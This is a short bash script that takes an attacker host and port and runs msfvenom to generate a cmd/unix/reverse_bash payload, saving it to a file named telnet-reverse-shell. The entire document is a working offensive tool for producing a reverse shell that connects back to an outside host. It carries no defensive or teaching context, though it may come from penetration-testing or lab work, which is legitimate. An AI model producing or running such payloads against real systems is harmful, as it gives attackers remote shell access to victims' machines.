#!/bin/bash

# check that $1 and $2 are set
if [ -z "$1" ] || [ -z "$2" ]; then
  echo "Usage: $0 <LHOST> <LPORT>"
  exit 1
fi

#create reverse shell
msfvenom -p cmd/unix/reverse_bash LHOST=$1 LPORT=$2 R > telnet-reverse-shell
